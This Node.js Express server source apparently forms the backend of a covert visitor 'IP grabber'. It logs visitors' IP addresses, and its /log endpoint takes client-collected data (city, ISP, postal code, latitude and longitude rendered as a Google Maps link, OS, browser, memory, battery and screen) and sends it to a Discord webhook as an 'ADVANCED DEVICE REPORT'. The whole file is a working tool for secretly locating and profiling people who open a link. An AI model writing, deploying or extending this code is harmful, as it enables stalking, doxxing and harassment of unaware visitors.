const express = require('express');
const axios = require('axios');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK = process.env.WEBHOOK;

function detectOS(userAgent) {
  userAgent = userAgent.toLowerCase();
  if (/windows phone/.test(userAgent)) return 'Windows Phone';
  if (/windows/.test(userAgent)) return 'Windows';
  if (/android/.test(userAgent)) return 'Android';
  if (/ipad|iphone|ipod/.test(userAgent)) return 'iOS';
  if (/mac os x/.test(userAgent)) return 'macOS';
  if (/linux/.test(userAgent)) return 'Linux';
  if (/cros/.test(userAgent)) return 'Chrome OS';
  return 'Unknown';
}

app.use(express.static(__dirname));
app.use(express.json());

app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const date = new Date().toLocaleString('en-US', { timeZone: 'Asia/Manila' });

  console.log(`[+] ${date} - Visitor: ${ip}`);
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/log', async (req, res) => {
  const data = req.body;
  const userAgent = req.headers['user-agent'] || '';
  data.os = detectOS(userAgent); // <-- Added OS detection here

  const date = new Date().toLocaleString('en-US', { timeZone: 'Asia/Manila' });

  console.log(`[+] ${date} - Received detailed client info`);
  console.log(data);

  const message = {
    content: '**=== ADVANCED DEVICE REPORT ===**',
    embeds: [{
      color: 0x2f3136,
      title: '📡 Visitor Info',
      fields: [
        { name: 'IP', value: data.ip || 'Unknown' },
        { name: 'City', value: data.city || 'Unknown', inline: true },
        { name: 'Region', value: data.region || 'Unknown', inline: true },
        { name: 'Country', value: data.country || 'Unknown', inline: true },
        { name: 'ISP', value: data.isp || 'Unknown' },
        { name: 'Map', value: `https://www.google.com/maps/search/?api=1&query=${data.lat},${data.lon}` },
        { name: 'Timezone', value: data.timezone || 'Unknown', inline: true },
        { name: 'Postal', value: data.postal || 'Unknown', inline: true }
      ],
      footer: { text: `Time: ${date}` }
    }, {
      color: 0x2f3136,
      title: '🖥️ Device Info',
      fields: [
        { name: 'OS', value: data.os || 'Unknown', inline: true },
        { name: 'Mobile', value: String(data.mobile), inline: true },
        { name: 'Browser', value: data.browser || 'Unknown', inline: true },
        { name: 'Memory', value: `${data.memory} GB`, inline: true },
        { name: 'Battery', value: `${data.battery}%`, inline: true },
        { name: 'Charging', value: String(data.charging), inline: true },
        { name: 'Screen', value: data.screen, inline: true },
        { name: 'Viewport', value: data.viewport, inline: true }
      ]
    }]
  };

  try {
    await axios.post(WEBHOOK, message);
    console.log('[+] Info sent to Discord.');
    res.sendStatus(200);
  } catch (err) {
    console.error('[!] Failed to send to Discord:', err.message);
    res.sendStatus(500);
  }
});

app.listen(PORT, () => {
  console.log(`[*] Server running on http://localhost:${PORT}`);
});
